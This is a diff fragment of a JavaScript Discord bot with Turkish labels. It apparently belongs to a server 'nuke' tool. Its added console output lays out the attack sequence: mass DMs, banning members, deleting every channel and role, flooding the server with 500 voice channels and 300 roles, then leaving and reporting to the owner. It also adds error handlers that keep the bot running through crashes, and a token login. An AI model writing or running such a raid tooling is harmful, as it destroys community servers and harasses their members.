@@ -664,4 +664,31 @@ client.on("ready", () => {
   CHANNEL_NAMES.forEach((name, index) => {
     console.log(`  ${index + 1}. ${name}`);
   });
-  console.log("═════════════
+  console.log("═══════════════════════════════════════");
+  console.log(`👥 Rol İsmi: ${ROLE_NAME}`);
+  console.log("═══════════════════════════════════════");
+  console.log("⚡ İşlem Sırası (SÜPER HIZLI MOD):");
+  console.log("  1. DM gönder (Batch: 5, Delay: 50ms)");
+  console.log("  2. Banla (Batch: 3, Delay: 100ms)");
+  console.log("  3. Kanalları sil (No delay)");
+  console.log("  4. Rolleri sil (No delay)");
+  console.log("  5. 500 ses kanalı (Batch: 25, Delay: 10ms)");
+  console.log("  6. 300 rol (Batch: 20, Delay: 20ms)");
+  console.log("  7. Sunucudan çık");
+  console.log("  8. Log gönder (Owner & Seri)");
+  console.log("═══════════════════════════════════════");
+});
+
+// ================== CRASH KALKAN ==================
+process.on("unhandledRejection", (err) => {
+  console.log("❌ UNHANDLED REJECTION:", err.message || err);
+});
+process.on("uncaughtException", (err) => {
+  console.log("💥 UNCAUGHT EXCEPTION:", err.message || err);
+});
+
+client.login(BOT_TOKEN).then(() => {
+  console.log("✅ Bot token ile giriş yapıldı!");
+}).catch(err => {
+  console.error("❌ Bot giriş hatası:", err.message);
+});
